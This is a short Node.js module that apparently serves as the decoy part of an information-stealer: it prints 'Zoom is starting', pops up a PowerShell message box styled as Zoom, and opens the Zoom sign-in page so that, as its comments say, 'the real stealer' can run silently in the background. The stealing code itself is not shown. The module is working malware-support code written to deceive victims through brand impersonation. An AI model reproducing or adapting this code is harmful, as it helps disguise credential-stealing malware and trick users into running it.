const { exec } = require('child_process');
const path = require('path');
const os = require('os');

module.exports = async () => {
  try {
    // === Fake Zoom loading / initialization screen ===
    console.log('Zoom is starting... Please wait.');

    // Delay to simulate real app loading (3–5 seconds feels natural)
    await new Promise(resolve => setTimeout(resolve, 4000));

    // Show a realistic-looking message box (PowerShell + .NET)
    // This mimics Zoom's "Initializing..." or "Connecting..." popup
    const psScript = `
      Add-Type -AssemblyName System.Windows.Forms
      Add-Type -AssemblyName System.Drawing
      [System.Windows.Forms.MessageBox]::Show(
        'Zoom is initializing video and audio services...\\nPlease wait a moment.',
        'Zoom',
        [System.Windows.Forms.MessageBoxButtons]::OK,
        [System.Windows.Forms.MessageBoxIcon]::Information
      )
    `;

    exec(`powershell -NoProfile -Command "${psScript}"`, (err) => {
      if (err) console.error('Fake Zoom popup failed:', err);
    });

    // Optional: Open a fake browser window to Zoom website (extra realism)
    // Uncomment if you want it (requires browser installed)

    exec('start https://zoom.us/signin', (err) => {
      if (err) console.error('Fake Zoom browser failed:', err);
    });


    // Let the real stealer continue silently in background
    console.log('Zoom initialized.');
  } catch (error) {
    // Silent fail — don't crash the stealer
    console.error('Fake Zoom error:', error);
  }
};
